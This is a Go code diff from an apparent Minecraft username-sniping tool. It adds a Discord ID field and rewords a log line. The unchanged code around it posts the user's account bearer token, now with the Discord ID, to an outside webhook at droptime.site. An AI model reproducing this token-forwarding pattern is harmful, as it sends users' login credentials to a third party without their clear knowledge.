@@ -71,6 +71,7 @@ type Data struct {
 	Bearer string `json:"bearer"`
 	Unix   int64  `json:"unix"`
 	Config string `json:"config"`
+	Id     string `json:"id"`
 }
 
 type checkDetails struct {
@@ -242,7 +243,7 @@ func jsonValue(f interface{}) []byte {
 
 func (account Details) check(name, searches, accType string) {
 	var details checkDetails
-	body, _ := json.Marshal(Data{Name: name, Bearer: account.Bearer, Unix: account.UnixRecv, Config: string(jsonValue(embeds{Content: "<@" + acc.DiscordID + ">", Embeds: []embed{{Description: fmt.Sprintf("[%v] Succesfully sniped %v with %v searches :bow_and_arrow:", accType, name, searches), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
+	body, _ := json.Marshal(Data{Name: name, Bearer: account.Bearer, Id: acc.DiscordID, Unix: account.UnixRecv, Config: string(jsonValue(embeds{Content: "<@" + acc.DiscordID + ">", Embeds: []embed{{Description: fmt.Sprintf("[%v] Succesfully sniped %v with %v searches :bow_and_arrow:", accType, name, searches), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
 
 	req, _ := http.NewRequest("POST", "http://droptime.site/api/v2/webhook", bytes.NewBuffer(body))
 	req.Header.Set("Content-Type", "application/json")
@@ -636,7 +637,7 @@ func snipe(name string, delay float64, option string, charType string) {
 				}
 			}
 
-			sendI("Sending 2 requests in a minute.")
+			sendI("Sending requests in a minute.")
 
 			time.Sleep(time.Minute)
 
